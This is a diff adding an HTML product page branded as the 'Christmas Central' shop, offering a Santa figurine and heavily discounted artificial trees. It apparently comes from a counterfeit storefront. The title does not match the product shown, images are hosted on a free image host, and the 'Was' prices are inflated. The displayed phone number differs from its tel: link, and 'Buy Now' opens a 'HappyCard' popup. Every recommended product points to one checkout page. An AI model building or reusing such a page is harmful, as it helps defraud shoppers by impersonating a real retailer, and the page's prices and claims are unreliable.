@@ -1,0 +1,1739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Product Page - Christmas Tree</title>
+   
+<link rel="stylesheet" href="styles.css"> 
+<link rel="stylesheet" href="style0.css"> 
+<link rel="stylesheet" href="style1.css">
+<link rel="stylesheet" href="style2.css">
+</head>
+<style>
+/* Product Gallery Styles */
+.product-gallery {
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+}
+
+.main-image {
+    margin: 0;
+    border-radius: 12px;
+    overflow: hidden;
+    background: #f8fafc;
+    position: relative;
+}
+
+.main-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+    transition: transform 0.3s ease;
+}
+
+.main-image:hover img {
+    transform: scale(1.02);
+}
+
+.thumbnail-gallery {
+    overflow-x: auto;
+    padding: 10px 0;
+}
+
+.thumbnail-list {
+    display: flex;
+    gap: 12px;
+    list-style: none;
+    margin: 0;
+    padding: 0;
+}
+
+.thumbnail-item {
+    flex-shrink: 0;
+}
+
+.thumbnail-btn {
+    width: 80px;
+    height: 80px;
+    padding: 0;
+    border: 2px solid transparent;
+    border-radius: 8px;
+    overflow: hidden;
+    background: none;
+    cursor: pointer;
+    transition: all 0.2s ease;
+}
+
+.thumbnail-btn:hover {
+    border-color: #4b7cff;
+    transform: translateY(-2px);
+}
+
+.thumbnail-btn.active {
+    border-color: #4b7cff;
+    box-shadow: 0 4px 12px rgba(75, 124, 255, 0.2);
+}
+
+.thumbnail-btn img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+}
+
+/* Responsive adjustments */
+@media (max-width: 768px) {
+    .thumbnail-btn {
+        width: 60px;
+        height: 60px;
+    }
+}
+</style>
+<body>
+
+
+  <!-- ========================================
+       TOP BANNER SECTION
+       Displays promotional features like free shipping
+  ========================================= -->
+  <section class="top-banner">
+    <div class="top-banner__container">
+      <!-- Accessibility Button -->
+      <div class="top-banner__accessibility">
+        <a href="#" class="accessibility-link">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/universal-access-1x128.webp" alt="Accessibility" class="accessibility-icon">
+       
+        </a>
+      </div>
+
+      <!-- Feature List -->
+      <ul class="top-banner__features">
+        <li class="feature-item">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/shipping.svg" alt="Free Shipping" class="feature-icon">
+          <span class="feature-text"><strong>FREE SHIPPING</strong> ON ALL ORDERS</span>
+        </li>
+        <li class="feature-item">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/afterpay.svg" alt="Pay Over Time" class="feature-icon">
+          <span class="feature-text"><strong>PAY OVER TIME</strong></span>
+        </li>
+        <li class="feature-item">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/secure.svg" alt="Secure Checkout" class="feature-icon">
+          <span class="feature-text"><strong>SECURE</strong> CHECKOUT</span>
+        </li>
+        <li class="feature-item">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/usa.svg" alt="Ships from USA" class="feature-icon">
+          <span class="feature-text">SHIPS FROM THE <strong>USA</strong></span>
+        </li>
+        <li class="feature-item">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/sbacertified.svg" alt="SBA Certified" class="feature-icon">
+          <span class="feature-text"><strong>SBA</strong> CERTIFIED</span>
+        </li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- ========================================
+       HEADER SECTION
+       Contains logo, search, and navigation
+  ========================================= -->
+  <header class="main-header">
+    <div class="main-header__container">
+      
+      <!-- Mobile Menu Button -->
+      <button class="mobile-menu-btn" aria-label="Open menu">
+        <span class="hamburger-icon"></span>
+      </button>
+
+      <!-- Logo -->
+      <div class="header-logo">
+        <a href="index.html">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/cc-bold-2025_1737748194__24372.original.png" alt="Christmas Central" class="logo-image">
+        </a>
+      </div>
+
+      <!-- Search Bar (Desktop) -->
+      <div class="header-search">
+        <form class="search-form" role="search">
+          <input type="search" name="search_query" placeholder="What can we help you find?" class="search-input">
+          <button type="submit" class="search-button">
+            <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/search.svg" alt="Search" class="search-icon">
+          </button>
+        </form>
+
+        <!-- User Actions -->
+        <nav class="user-actions">
+         
+          <a href="/wishlist.php" class="user-action-link wishlist-link">
+            <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/wishlist.svg" alt="Wishlist" class="action-icon">
+            <span class="badge">0</span>
+          </a>
+          <a href="/cart.php" class="user-action-link cart-link">
+            <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/cart.svg" alt="Cart" class="action-icon">
+            <span class="badge">0</span>
+          </a>
+        </nav>
+      </div>
+    </div>
+
+    <!-- Mobile Search Bar -->
+    <div class="mobile-search">
+      <form class="search-form" role="search">
+        <input type="search" name="search_query" placeholder="What can we help you find?" class="search-input">
+        <button type="submit" class="search-button">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/search.svg" alt="Search" class="search-icon">
+        </button>
+      </form>
+    </div>
+  </header>
+
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+            
+            <!-- Breadcrumb Navigation (Desktop Only) -->
+            <nav class="breadcrumb" aria-label="Breadcrumb">
+                <ol class="breadcrumb-list">
+                    <li class="breadcrumb-item">
+                        <a href="/">Home</a>
+                        <span class="breadcrumb-separator">/</span>
+                    </li>
+                    <li class="breadcrumb-item">
+                        <a href="/sale/">Wreaths and Garland</a>
+                        <span class="breadcrumb-separator">/</span>
+                    </li>
+                    <li class="breadcrumb-item">
+                        <a href="/sale/artificial-christmas-trees/">Shatterproof and Unbreakable</a>
+                       
+                    </li>
+                    
+                </ol>
+            </nav>
+            
+            <!-- Product Details -->
+            <article class="product-details">
+                <div class="product-grid">
+                    
+
+
+
+
+
+
+                    <!-- Product Gallery -->
+<section class="product-gallery" aria-label="Product images">
+    <!-- Main product image -->
+    <figure class="main-image">
+        <a href="https://i.ibb.co/5xzZNGQc/northlight-e82299-19780.jpg" aria-label="View full size image" id="mainImageLink">
+            <img src="https://i.ibb.co/5xzZNGQc/northlight-e82299-19780.jpg" 
+                 alt="Real Touch™️ Pre-Lit Full Oregon Noble Fir Artificial Christmas Tree - 6.5' - Warm White LED Lights"
+                 id="mainImage">
+        </a>
+    </figure>
+    
+    <!-- Thumbnail gallery -->
+    <div class="thumbnail-gallery">
+        <ul class="thumbnail-list">
+            <li class="thumbnail-item">
+                <button type="button" aria-label="View image 1" class="thumbnail-btn active" data-image="https://c.animaapp.com/mir9ui2cWlhiDO/assets/75.jpg" data-full="https://c.animaapp.com/mir9ui2cWlhiDO/assets/1.jpg">
+                    <img src="https://i.ibb.co/5xzZNGQc/northlight-e82299-19780.jpg" alt="Thumbnail 1 - Front view">
+                </button>
+            </li>
+            <li class="thumbnail-item">
+                <button type="button" aria-label="View image 2" class="thumbnail-btn" data-image="https://c.animaapp.com/mir9ui2cWlhiDO/assets/72.jpg" data-full="https://c.animaapp.com/mir9ui2cWlhiDO/assets/2.jpg">
+                    <img src="https://i.ibb.co/5xzZNGQc/northlight-e82299-19780.jpg" alt="Thumbnail 2 - Side view">
+                </button>
+            </li>
+            <li class="thumbnail-item">
+                <button type="button" aria-label="View image 3" class="thumbnail-btn" data-image="https://c.animaapp.com/mir9ui2cWlhiDO/assets/71.jpg" data-full="https://c.animaapp.com/mir9ui2cWlhiDO/assets/3.jpg">
+                    <img src="https://i.ibb.co/5xzZNGQc/northlight-e82299-19780.jpg" alt="Thumbnail 3 - Decorated view">
+                </button>
+            </li>
+            <li class="thumbnail-item">
+                <button type="button" aria-label="View image 4" class="thumbnail-btn" data-image="https://c.animaapp.com/mir9ui2cWlhiDO/assets/64.jpg" data-full="https://c.animaapp.com/mir9ui2cWlhiDO/assets/4.jpg">
+                    <img src="https://i.ibb.co/5xzZNGQc/northlight-e82299-19780.jpg" alt="Thumbnail 4 - Detailed view">
+                </button>
+            </li>
+        </ul>
+    </div>
+</section>
+                    
+
+
+
+
+
+
+
+                    <!-- Product Information -->
+                    <section class="product-info">
+                        <!-- Brand -->
+                        <p class="product-brand">
+                            <a href="/brands/northlight">Northlight</a>
+                        </p>
+                        
+                        <!-- Product title -->
+                        <h1 class="product-title">
+                        24" Gold and Brown Standing Santa Claus Christmas Figurine with Staff
+
+
+
+
+
+
+
+
+
+                        </h1>
+                        
+                        <!-- Rating summary -->
+                        <div class="product-rating">
+                            <div class="stars" aria-label="Rated 5.0 out of 5 stars">
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                            </div>
+                            <span class="rating-value">5.0</span>
+                            <a href="#reviews" class="review-count">(1)</a>
+                        </div>
+                        
+                        <!-- Pricing -->
+                        <div class="product-pricing">
+  
+                            <div class="price-now">
+                                <span class="label">Now:</span>
+                                <span class="value">$19.99</span>
+                            </div>
+                           
+                        </div>
+                        
+                        <!-- Payment options -->
+                  
+                        
+                        <!-- Key features -->
+                        <ul class="product-features">
+                            <li>Gold and brown modern medieval Santa figurine
+
+
+
+
+
+
+</li>
+                            <li>Equipped with a bronze sack full of gifts, gold horn, pine sprigs, and majestic golden staff
+
+
+
+
+
+
+
+</li>
+                            <li>Carrying a gift sack and golden staff
+
+
+
+
+
+
+</li>
+
+  
+                        </ul>
+                        
+                        <!-- Add to cart form -->
+                        <form class="add-to-cart-form">
+                            <!-- Quantity selector -->
+                            <div class="quantity-selector">
+                                <label for="quantity">Quantity:</label>
+                                <div class="quantity-controls">
+                                    <button type="button" aria-label="Decrease quantity" class="qty-btn decrease">−</button>
+                                    <input type="number" id="quantity" name="qty" value="1" min="1" max="10" aria-label="Quantity">
+                                    <button type="button" aria-label="Increase quantity" class="qty-btn increase">+</button>
+                                </div>
+                                <p class="stock-info">Current Stock: <span>10</span></p>
+                            </div>
+                            
+                     <!-- Action buttons -->
+<div class="action-buttons">
+    <button type="button" class="btn-add-to-cart" id="openHappyCardPopup">Buy Now</button>
+</div>
+                        </form>
+                        
+                        <!-- Product metadata -->
+                        <div class="product-meta">
+                            <span class="label">SKU:</span>
+                            <span class="value">GB516800438</span>
+                        </div>
+                        
+                        <!-- Social sharing -->
+                        <div class="social-sharing">
+                            <h2 class="sr-only">Share this product</h2>
+                            <ul class="catalog-social-links">
+                                <li>
+                                    <a href="#" aria-label="Share on Facebook" target="_blank" rel="noopener noreferrer">
+                                        <span class="social-icon">f</span>
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="#" aria-label="Share via email">
+                                        <span class="social-icon">✉</span>
+                                    </a>
+                                </li>
+                                <li>
+                                    <button type="button" aria-label="Print this page">
+                                        <span class="social-icon">⎙</span>
+                                    </button>
+                                </li>
+                                <li>
+                                    <a href="#" aria-label="Share on Twitter" target="_blank" rel="noopener noreferrer">
+                                        <span class="social-icon">𝕏</span>
+                                    </a>
+                                </li>
+                                <li>
+                                    <a href="#" aria-label="Share on Pinterest" target="_blank" rel="noopener noreferrer">
+                                        <span class="social-icon">P</span>
+                                    </a>
+                                </li>
+                            </ul>
+                        </div>
+                    </section>
+                </div>
+                
+                <!-- Product Description -->
+                <section class="product-description">
+                    <h2>Description</h2>
+                    <div class="description-content">
+                        <p>The standing Santa Claus with staff adds a flavor of joy to your life. This figurine can be positioned in any suitable corner or can act as a centerpiece in your living area. It impresses your friends and family, bringing in a festive galore.
+
+
+
+
+
+
+</p>
+                        
+                        <h3>Product Features:</h3>
+                        <ul>
+                            <li>Modern medieval Santa shines in hues of gold and bronze
+
+
+
+</li>
+                            <li>Donning a warm brown suit and hat trimmed in matching fur
+
+
+
+
+
+
+</li>
+                            <li>Sparkling gold vest with ornate gold buttons and shiny gold boots
+
+
+
+
+
+
+
+</li>
+                            <li>Equipped with a bronze sack full of gifts, gold horn, pine sprigs and majestic golden staff
+
+
+
+
+
+
+
+</li>
+  
+                            <li>Dimensions: 24"H x 10.5"W x 8.5"D
+
+
+
+
+
+</li>
+                            <li>Material(s): plastic/fabric/faux fur
+
+
+
+
+
+</li>
+                     
+                        </ul>
+                        
+                       
+                </section>
+                
+                
+	<!-- ========================================
+         PRODUCT CAROUSEL SECTION
+         Featured products with horizontal scroll
+The Best Black Friday Tree Deals
+
+    ========================================= -->
+    
+<div class="deals-section">
+        <header class="products-section-header">
+            <h2>Just For You</h2>
+        </header>
+        
+        <div class="carousel-container">
+            <button class="nav-btn prev-btn" aria-label="Previous slide">
+                <span class="arrow">‹</span>
+            </button>
+            
+            <div class="products-carousel">
+                <!-- Product 1 -->
+                <div class="product-card">
+                    <figure class="product-image">
+                        <a href="checkout_page_1.html">
+                            <img src="https://c.animaapp.com/miq7vmsa35ok7I/assets/northlight_z36647_updated_3__33986.1.jpg" 
+                                 alt="Real Touch Pre-Lit Full Noble Fir Artificial Christmas Tree - 7.5' - Clear Lights">
+                        </a>
+                    </figure>
+                    
+                    <div class="product-info">
+                        <p class="brand">Northlight</p>
+                        <h3 class="product-title">
+                            <a href="checkout_page_1.html">
+                                Real Touch™️ Pre-Lit Full Noble Fir Artificial Christmas Tree - 7.5' - Clear Lights
+                            </a>
+                        </h3>
+                        
+                        <div class="rating-section">
+                            <div class="stars">
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star half">★</span>
+                            </div>
+                            <div class="rating-text">4.5 (15)</div>
+                        </div>
+                        
+                        <div class="price-section">
+                            <span class="current-price">$106.99</span>
+                            <div class="original-price">
+                                Was: <span class="old-price">$421.99</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <a href="checkout_page_1.html" class="quick-view-btn" role="button">
+                        Quick view
+                    </a>
+                </div>
+                
+                <!-- Product 2 -->
+                <div class="product-card">
+                    <figure class="product-image">
+                        <a href="checkout_page_1.html">
+                            <img src="https://c.animaapp.com/miq7vmsa35ok7I/assets/northlight-z84462-stylized-9132024__09392.1.jpg" 
+                                 alt="10' Pre-Lit Full Northern Pine Artificial Christmas Tree, Multi Lights">
+                        </a>
+                    </figure>
+                    
+                    <div class="product-info">
+                        <p class="brand">Northlight</p>
+                        <h3 class="product-title">
+                            <a href="checkout_page_1.html">
+                                10' Pre-Lit Full Northern Pine Artificial Christmas Tree, Multi Lights
+                            </a>
+                        </h3>
+                        
+                        <div class="rating-section">
+                            <div class="stars">
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star half">★</span>
+                                <span class="star empty">★</span>
+                            </div>
+                            <div class="rating-text">3.6 (22)</div>
+                        </div>
+                        
+                        <div class="price-section">
+                            <span class="current-price">$119.99</span>
+                            <div class="original-price">
+                                Was: <span class="old-price">$682.99</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <a href="checkout_page_1.html" class="quick-view-btn" role="button">
+                        Quick view
+                    </a>
+                </div>
+                
+                <!-- Product 3 -->
+                <div class="product-card">
+                    <figure class="product-image">
+                        <a href="checkout_page_1.html">
+                            <img src="https://c.animaapp.com/miq7vmsa35ok7I/assets/northlight_gb516800438_gb15590_styled_01__05890.1.jpg" 
+                                 alt="Real Touch Pre-Lit Full Oregon Noble Fir Artificial Christmas Tree - 6.5' - Warm White LED Lights">
+                        </a>
+                    </figure>
+                    
+                    <div class="product-info">
+                        <p class="brand">Northlight</p>
+                        <h3 class="product-title">
+                            <a href="checkout_page_1.html">
+                                Real Touch™️ Pre-Lit Full Oregon Noble Fir Artificial Christmas Tree - 6.5' - Warm White LED Lights
+                            </a>
+                        </h3>
+                        
+                        <div class="rating-section">
+                            <div class="stars">
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                            </div>
+                            <div class="rating-text">5.0 (1)</div>
+                        </div>
+                        
+                        <div class="price-section">
+                            <span class="current-price">$339.99</span>
+                            <div class="original-price">
+                                Was: <span class="old-price">$1,654.99</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <a href="checkout_page_1.html" class="quick-view-btn" role="button">
+                        Quick view
+                    </a>
+                </div>
+                
+                <!-- Product 4 -->
+                <div class="product-card">
+                    <figure class="product-image">
+                        <a href="checkout_page_1.html">
+                            <img src="https://c.animaapp.com/miq7vmsa35ok7I/assets/northlight_lt91586updated_5__97361.1.jpg" 
+                                 alt="Real Touch Flocked Little River Fir Artificial Christmas Tree - Unlit - 6.5'">
+                        </a>
+                    </figure>
+                    
+                    <div class="product-info">
+                        <p class="brand">Northlight</p>
+                        <h3 class="product-title">
+                            <a href="checkout_page_1.html">
+                                Real Touch™️ Flocked Little River Fir Artificial Christmas Tree - Unlit - 6.5'
+                            </a>
+                        </h3>
+                        
+                        <div class="rating-section">
+                            <div class="stars">
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                            </div>
+                            <div class="rating-text">0.0 (0)</div>
+                        </div>
+                        
+                        <div class="price-section">
+                            <span class="current-price">$111.99</span>
+                            <div class="original-price">
+                                Was: <span class="old-price">$349.99</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <a href="checkout_page_1.html" class="quick-view-btn" role="button">
+                        Quick view
+                    </a>
+                </div>
+                
+                <!-- Product 5 -->
+                <div class="product-card">
+                    <figure class="product-image">
+                        <a href="checkout_page_1.html">
+                            <img src="https://c.animaapp.com/miq7vmsa35ok7I/assets/northlight_v27366-stylized-8-22-24-__82457.1.jpg" 
+                                 alt="Real Touch Pre-Lit Full Northern Pine Artificial Christmas Tree - 6.5' - Clear LED Lights">
+                        </a>
+                    </figure>
+                    
+                    <div class="product-info">
+                        <p class="brand">Northlight</p>
+                        <h3 class="product-title">
+                            <a href="checkout_page_1.html">
+                                Real Touch™️ Pre-Lit Full Northern Pine Artificial Christmas Tree - 6.5' - Clear LED Lights
+                            </a>
+                        </h3>
+                        
+                        <div class="rating-section">
+                            <div class="stars">
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                            </div>
+                            <div class="rating-text">5.0 (2)</div>
+                        </div>
+                        
+                        <div class="price-section">
+                            <span class="current-price">$112.99</span>
+                            <div class="original-price">
+                                Was: <span class="old-price">$589.99</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <a href="checkout_page_1.html" class="quick-view-btn" role="button">
+                        Quick view
+                    </a>
+                </div>
+                
+                <!-- Product 6 -->
+                <div class="product-card">
+                    <figure class="product-image">
+                        <a href="checkout_page_1.html">
+                            <img src="https://c.animaapp.com/miq7vmsa35ok7I/assets/northlight_v94168_styled_2__08021.1.jpg" 
+                                 alt="4' Real Touch Pre-Lit Medium Grande Spruce Artificial Potted Christmas Tree - Clear Lights">
+                        </a>
+                    </figure>
+                    
+                    <div class="product-info">
+                        <p class="brand">Northlight</p>
+                        <h3 class="product-title">
+                            <a href="checkout_page_1.html">
+                                4' Real Touch™ Pre-Lit Medium Grande Spruce Artificial Potted Christmas Tree - Clear Lights
+                            </a>
+                        </h3>
+                        
+                        <div class="rating-section">
+                            <div class="stars">
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                            </div>
+                            <div class="rating-text">0.0 (0)</div>
+                        </div>
+                        
+                        <div class="price-section">
+                            <span class="current-price">$99.99</span>
+                            <div class="original-price">
+                                Was: <span class="old-price">$194.99</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <a href="checkout_page_1.html" class="quick-view-btn" role="button">
+                        Quick view
+                    </a>
+                </div>
+                
+                <!-- Product 7 -->
+                <div class="product-card">
+                    <figure class="product-image">
+                        <a href="checkout_page_1.html">
+                            <img src="https://c.animaapp.com/miq7vmsa35ok7I/assets/northlight_lt96968_lt96969_lt96970_styled_01__19037.1.jpg" 
+                                 alt="Real Touch Elite Pre-Lit Calgary Pine IPT Artificial Christmas Tree - 6' Dual Color LED">
+                        </a>
+                    </figure>
+                    
+                    <div class="product-info">
+                        <p class="brand">Northlight</p>
+                        <h3 class="product-title">
+                            <a href="checkout_page_1.html">
+                                Real Touch™️Elite Pre-Lit Calgary Pine IPT Artificial Christmas Tree - 6' Dual Color LED
+                            </a>
+                        </h3>
+                        
+                        <div class="rating-section">
+                            <div class="stars">
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                                <span class="star empty">★</span>
+                            </div>
+                            <div class="rating-text">0.0 (0)</div>
+                        </div>
+                        
+                        <div class="price-section">
+                            <span class="current-price">$125.99</span>
+                            <div class="original-price">
+                                Was: <span class="old-price">$549.99</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <a href="checkout_page_1.html" class="quick-view-btn" role="button">
+                        Quick view
+                    </a>
+                </div>
+                
+                <!-- Product 8 -->
+                <div class="product-card">
+                    <figure class="product-image">
+                        <a href="checkout_page_1.html">
+                            <img src="https://c.animaapp.com/miq7vmsa35ok7I/assets/sku_northlight_hb27126-02-stylized_image-8-14-24__03792.1.jpg" 
+                                 alt="6.5' Pre-Lit Full Silverthorne Fir Artificial Christmas Tree - Warm White LED Lights">
+                        </a>
+                    </figure>
+                    
+                    <div class="product-info">
+                        <p class="brand">Northlight</p>
+                        <h3 class="product-title">
+                            <a href="checkout_page_1.html">
+                                6.5' Pre-Lit Full Silverthorne Fir Artificial Christmas Tree - Warm White LED Lights
+                            </a>
+                        </h3>
+                        
+                        <div class="rating-section">
+                            <div class="stars">
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                                <span class="star">★</span>
+                            </div>
+                            <div class="rating-text">5.0 (1)</div>
+                        </div>
+                        
+                        <div class="price-section">
+                            <span class="current-price">$117.99</span>
+                            <div class="original-price">
+                                Was: <span class="old-price">$399.99</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <a href="checkout_page_1.html" class="quick-view-btn" role="button">
+                        Quick view
+                    </a>
+                </div>
+            </div>
+            
+            <button class="nav-btn next-btn" aria-label="Next slide">
+                <span class="arrow">›</span>
+            </button>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+	 <!-- SECTION: Customer Reviews -->
+    <section id="reviews" class="customer-reviews" aria-labelledby="reviews-heading">
+        <header class="reviews-header">
+            <h2 id="reviews-heading">Reviews</h2>
+        </header>
+
+        <!-- Rating Summary -->
+        <div class="rating-summary">
+            
+            <!-- Rating breakdown -->
+            <div class="rating-breakdown">
+                <h3>Rating Snapshot</h3>
+                <p class="snapshot-note">Select a row below to filter reviews.</p>
+                <div class="rating-bars">
+                    <button type="button" class="rating-filter" aria-label="Filter by 5 star reviews (1 review)">
+                        <span class="star-label">5 stars</span>
+                        <div class="bar-container">
+                            <div class="bar-fill full"></div>
+                        </div>
+                        <span class="count">1</span>
+                    </button>
+                    <button type="button" class="rating-filter" aria-label="Filter by 4 star reviews (0 reviews)">
+                        <span class="star-label">4 stars</span>
+                        <div class="bar-container">
+                            <div class="bar-fill empty"></div>
+                        </div>
+                        <span class="count">0</span>
+                    </button>
+                    <button type="button" class="rating-filter" aria-label="Filter by 3 star reviews (0 reviews)">
+                        <span class="star-label">3 stars</span>
+                        <div class="bar-container">
+                            <div class="bar-fill empty"></div>
+                        </div>
+                        <span class="count">0</span>
+                    </button>
+                    <button type="button" class="rating-filter" aria-label="Filter by 2 star reviews (0 reviews)">
+                        <span class="star-label">2 stars</span>
+                        <div class="bar-container">
+                            <div class="bar-fill empty"></div>
+                        </div>
+                        <span class="count">0</span>
+                    </button>
+                    <button type="button" class="rating-filter" aria-label="Filter by 1 star reviews (0 reviews)">
+                        <span class="star-label">1 star</span>
+                        <div class="bar-container">
+                            <div class="bar-fill empty"></div>
+                        </div>
+                        <span class="count">0</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Overall rating -->
+            <div class="overall-rating">
+                <h3>Overall Rating</h3>
+                <div class="rating-display">
+                    <div class="rating-score">5.0</div>
+                    <div class="rating-details">
+                        <div class="stars" aria-label="Rated 5.0 out of 5 stars">
+                            <span class="star">★</span>
+                            <span class="star">★</span>
+                            <span class="star">★</span>
+                            <span class="star">★</span>
+                            <span class="star">★</span>
+                        </div>
+                        <p class="review-count">1 Review</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Review Filters -->
+        <div class="review-filters">
+            <h3>Filter Reviews</h3>
+            
+            <!-- Search reviews -->
+            <div class="search-reviews">
+                <label for="review-search" class="sr-only">Search reviews</label>
+                <div class="search-box">
+                    <input type="search" id="review-search" placeholder="Search topics and reviews">
+                    <button type="submit" aria-label="Search reviews" class="search-btn">
+                        <span class="search-icon">🔍</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Filter dropdowns -->
+            <div class="filter-options">
+                <div class="filter-dropdown">
+                    <label for="rating-filter">Filter by rating</label>
+                    <select id="rating-filter">
+                        <option value="">Rating</option>
+                        <option value="5">5 Stars</option>
+                        <option value="4">4 Stars</option>
+                        <option value="3">3 Stars</option>
+                        <option value="2">2 Stars</option>
+                        <option value="1">1 Star</option>
+                    </select>
+                </div>
+                <div class="filter-dropdown">
+                    <label for="locale-filter">Filter by locale</label>
+                    <select id="locale-filter">
+                        <option value="">Locale</option>
+                        <option value="us">United States</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <!-- Review List -->
+        <div class="review-list">
+            <div class="review-header">
+                <p class="review-range">1 – 1 of 1 Review</p>
+                <div class="sort-dropdown">
+                    <label for="review-sort">Sort reviews</label>
+                    <select id="review-sort">
+                        <option value="relevant">Most Relevant</option>
+                        <option value="recent">Most Recent</option>
+                        <option value="high">Highest Rating</option>
+                        <option value="low">Lowest Rating</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Individual review -->
+            <article class="review-item">
+                <header class="review-header-info">
+                    <div class="stars" aria-label="Rated 5 out of 5 stars">
+                        <span class="star">★</span>
+                        <span class="star">★</span>
+                        <span class="star">★</span>
+                        <span class="star">★</span>
+                        <span class="star">★</span>
+                    </div>
+                    <p class="review-location">Reviewed in United States</p>
+                    <div class="reviewer-info">
+                        <span class="reviewer-name">Paula R</span>
+                        <span class="review-date">4 years ago</span>
+                    </div>
+                </header>
+                
+                <div class="review-content">
+                    <p>Looks very life like. Good quality and easy to put up</p>
+                </div>
+
+                <!-- Review actions -->
+                <div class="review-actions">
+                    <span class="helpful-label">Helpful?</span>
+                    <button type="button" class="helpful-btn" aria-label="Mark review as helpful (0 people found this helpful)">
+                        <span class="thumbs-up">👍</span>
+                        <span class="action-count">(0)</span>
+                    </button>
+                    <button type="button" class="not-helpful-btn" aria-label="Mark review as not helpful (0 people found this not helpful)">
+                        <span class="thumbs-down">👎</span>
+                        <span class="action-count">(0)</span>
+                    </button>
+                    <button type="button" class="report-btn">
+                        Report
+                    </button>
+                </div>
+            </article>
+
+        </div>
+    </section>
+    </main>
+<!-- ========================================
+       FOOTER SECTION
+       Company info, links, and newsletter
+  ========================================= -->
+  <footer class="main-footer">
+    
+    <!-- Trust Badges -->
+    <section class="trust-badges">
+      <div class="trust-badges__container">
+        <h2 class="section-title">Shop With Confidence</h2>
+        <ul class="trust-list">
+          <li class="trust-item">
+            <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/shipping.svg" alt="Free Shipping" class="trust-icon">
+            <span class="trust-text"><strong>FREE Ground</strong> Shipping</span>
+          </li>
+          <li class="trust-item">
+            <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/returns.svg" alt="Returns" class="trust-icon">
+            <span class="trust-text"><strong>30 Day Return</strong> Policy</span>
+          </li>
+          <li class="trust-item">
+            <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/usa.svg" alt="USA" class="trust-icon">
+            <span class="trust-text">Shipped From <strong>The USA</strong></span>
+          </li>
+          <li class="trust-item">
+            <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/afterpay.svg" alt="Pay Over Time" class="trust-icon">
+            <span class="trust-text"><strong>Pay Over</strong> Time*</span>
+          </li>
+          <li class="trust-item">
+            <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/secure1.svg" alt="Secure" class="trust-icon">
+            <span class="trust-text"><strong>Secure</strong> Checkout</span>
+          </li>
+          <li class="trust-item">
+            <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/sbacertified.svg" alt="SBA" class="trust-icon">
+            <span class="trust-text"><strong>Certified</strong> Small Business</span>
+          </li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Footer Links -->
+    <section class="footer-links">
+      <div class="footer-links__container">
+        
+        <!-- Column 1: About Order -->
+        <div class="footer-column">
+          <h3 class="footer-heading">About Your Order</h3>
+          <ul class="footer-list">
+            <li><a href="#">Collection of Sales Tax</a></li>
+            <li><a href="#">FAQ</a></li>
+            <li><a href="#">Shipping Information</a></li>
+            <li><a href="#">Returns & Exchanges</a></li>
+          </ul>
+        </div>
+
+        <!-- Column 2: Company -->
+        <div class="footer-column">
+          <h3 class="footer-heading">Company</h3>
+          <ul class="footer-list">
+            <li><a href="#">About us</a></li>
+            <li><a href="#">Resources</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Careers</a></li>
+          </ul>
+        </div>
+
+        <!-- Column 3: Customer Service -->
+        <div class="footer-column">
+          <h3 class="footer-heading">Customer Service</h3>
+          <ul class="footer-list">
+            <li><a href="#" class="help-desk-link">Help Desk</a></li>
+            <li><a href="tel:844-329-5677">Phone: 786-772-4726</a></li>
+            <li class="address-info">
+              Return address:<br>
